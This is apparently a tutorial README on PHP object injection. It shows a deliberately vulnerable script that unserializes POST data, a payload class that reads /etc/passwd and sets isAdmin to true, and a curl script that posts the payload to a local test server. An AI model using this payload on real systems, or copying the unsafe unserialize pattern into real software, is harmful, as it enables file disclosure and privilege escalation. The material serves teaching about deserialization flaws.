# PHP-Object-Injection

   PHP Object Injection enables the manipulation of an object content that shall be unserialized using the PHP unserialize() function. Thus, to fisrt understand the injection we may first understand the functions serialialize() and unserialize().
   
# Serealization and Deserealization.
   
   Developing web applications sometimes require to transfer data for storing, communication, logging, etc. This way the concepts of serealization and deserealization are born.<br>
     — Serialization is a process that converts an object into a specific structure data format such as convert Java Entity class to JSON format for sending via communication with other services or clients or maybe to storage.<br>
     — Deserialization is a process that converts data format into an object such as client sends requests as JSON data format and back end service convert it to Java Entity Class.<br>
   When receiving untrusted data without sufficient data verification a common vulnerability can be exploited, "Insecure Deserialization" that is in OWASP top 10 Web. 
   
# Exploiting Insecure Deserealization. 
   There are two things interconnected that we need to exploit this:<br>
   
   — The unserializacion of an object which manipulation is feasible from the user’s side (i.e. a cookie storing data as a serialized object)<br>
   — The use of a magic method (__wakeup, __destroy…) that can be abused in order to achieve interesting actions from a malicious user’s perspective (commands remote execution, file manipulation, etc.).

   Now that we know the concepts let's dive into the practice. Firsts things first, let's see how a serialized object looks like, we have a simple class "Users" that have two attributes(username, and isAdmin) and one simple method(PrintData), that verify if the user is or not an admin, then i just create an object and set the values of the attributes, the user is "JeJe" and isn't and admin.<br>
   
   ```php
   
class Users{

      public $username;
      public $isAdmin;

      public function PrintData(){
             if($this->isAdmin){
               echo $this->username . " is an admin\n"; 
             }else{
               echo $this->username . " is not an admin\n";
             }
      }
}

$obj = new Users();
$obj->username = 'JeJe';
$obj->isAdmin = False;

echo serialize($obj);

```
After the echo, using the php interpreter the output is:<br> 

![Alt text](/images/1.png)

O:5:"Users":2:{s:8:"username";s:4:"JeJe";s:7:"isAdmin";b:0;}<br>

   The syntax of the serialized string is relatively easy to understand: The O stands for the type of the serialized string. In this case the O maps to a PHP object. The 5 seperated by the colons represents the length of the name of the obj, so the structure is like "type:lenght:value". The 2 means that the object has two attributes, then the same logic is implemented to the attributes of the class inside of the brackets, 's' for strings and 'b' for boolean.<br>

   Now that we saw how an serialized object looks like let's implement a simple logic to see how we can exploit this. First let's change a litle bit the code, now there is another class in the same file that can read files from the system with the variable "filename".<br>
   
```php
class ReadFile{
 
      public function __tostring(){
             return file_get_contents($this->filename);      
      }

}
class Users{

      public $username;
      public $isAdmin;

      public function PrintData(){
             if($this->isAdmin){
               echo $this->username . " is an admin\n"; 
             }else{
               echo $this->username . " is not an admin\n";
             }
      }
}

$obj = unserialize($_POST['jeje']);
$obj->PrintData();
```

So if supposing that we found this code from a website and we want to verify if the code is vulnerable, looking at the code they are receiving some serialized object from a POST request that has a field 'jeje', and calling the method PrintData() to show if the user is an admin. So we can make a POST request whith the field 'jeje' containing a serialized object that we want, so let's do that.

First we have to create a class with the same attributes and everything, because the object must be equal to the original but with some malicious modifications that won't be noticed. 

```php
class ReadFile{
      
      public function __construct(){
             $this->filename = "/etc/passwd";
      }
}

class Users{

     public function __construct(){
            $this->username = new ReadFile();
	         $this->isAdmin = True;
     }
     
}

$obj = new Users();

echo serialize($obj);
echo "\n";
```

   The modification that i made was adding a constructor method, that is called every time that an object is created, so when the object from the class Users is created the "contructor" is called and it's gonna set the value of the username to another object from the class ReadFile(the class that can read a file from the system), then the constructor of the ReadFile class is called because an object from this class was set to the variable "username". Inside of the constructor the variable "filename" is set to a name from a file that i want to read.<br>

   Everything done we can create the serialized object from this malicious code that we want to inject:

![Alt text](/images/3.png)
   
   Now let's make the POST request with the serialized object that was created. To do this i created a local web server on machine with the original users.php file, to be the target. Before as you can se if i change the content from the field "b:0;" i can turn the user "jeje" in admin, because the value 0 is for the variable "isAdmin" and how it's boolean if i set to "1" i can become the admin.<br>
   
![Alt text](/images/2.png)

Making the request i can now become the admin and read the file "/etc/passwd".

![Alt text](/images/4.gif)
   
obs: the exploit.sh contains the same code from the other image (curl -XPOST...) i just write this in a script to avoid write this everytime that i needed. The content:<br>

```php
#!/bin/bash
curl -XPOST -d "jeje=$1" 127.0.0.1:80/users.php
```

Anyways that was a simple example to you understand how this attack can be exploited, hope u liked :-).   
   

